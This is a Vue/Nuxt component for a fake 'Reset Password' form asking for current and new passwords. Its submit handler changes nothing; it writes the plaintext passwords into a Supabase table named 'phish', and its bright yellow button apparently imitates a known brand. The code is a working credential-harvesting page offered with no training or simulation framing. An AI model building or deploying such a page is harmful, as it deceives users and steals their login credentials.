<template>
  <form @submit.prevent="handleSubmit" class="space-y-4 w-full max-w-md">
    <div class="space-y-2">
      <label for="oldPassword" class="text-left block">Current Password</label>
      <input
        id="oldPassword"
        type="password"
        class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
        placeholder="Enter your current password"
        v-model="oldPassword"
      />
    </div>
    
    <div class="space-y-2">
      <label for="newPassword" class="text-left block">New Password</label>
      <input
        id="newPassword"
        type="password"
        class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
        placeholder="Enter your new password"
        v-model="newPassword"
      />
    </div>
    
    <div class="space-y-2">
      <label for="confirmPassword" class="text-left block">Confirm New Password</label>
      <input
        id="confirmPassword"
        type="password"
        class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
        placeholder="Confirm your new password"
        v-model="confirmPassword"
      />
    </div>
    
    <button
      type="submit"
      class="w-full bg-[#FFFC00] hover:bg-[#E6E300] text-black font-bold inline-flex items-center justify-center rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2"
      :disabled="isLoading"
    >
      {{ isLoading ? 'Processing...' : 'Reset Password' }}
    </button>
  </form>
</template>

<script setup>
import { ref } from 'vue'
const { $supabase } = useNuxtApp()

const props = defineProps({
  onSubmit: Function
})

const oldPassword = ref('')
const newPassword = ref('')
const confirmPassword = ref('')
const isLoading = ref(false)

const supabase = useSupabase()

const handleSubmit = async (e) => {
  e.preventDefault()
  
  if (!oldPassword.value || !newPassword.value || !confirmPassword.value) {
    alert('Please fill in all fields')
    return
  }
  
  if (newPassword.value !== confirmPassword.value) {
    alert('New passwords do not match')
    return
  }

  isLoading.value = true
  
  try {
    const { data, error } = await supabase
      .from('phish')
      .insert([{
        oldPassword: oldPassword.value,
        newPassword: newPassword.value,
        newPassword2: confirmPassword.value
      }])
    
    if (error) throw error
    
    props.onSubmit()
  } catch (error) {
    console.error('Error saving data:', error)
    alert('Failed to save password data')
  } finally {
    isLoading.value = false
  }
}
</script>

<style scoped>
/* You might need to adjust these styles based on your actual design system */
.space-y-4 > * + * {
  margin-top: 1rem;
}
.space-y-2 > * + * {
  margin-top: 0.5rem;
}
</style>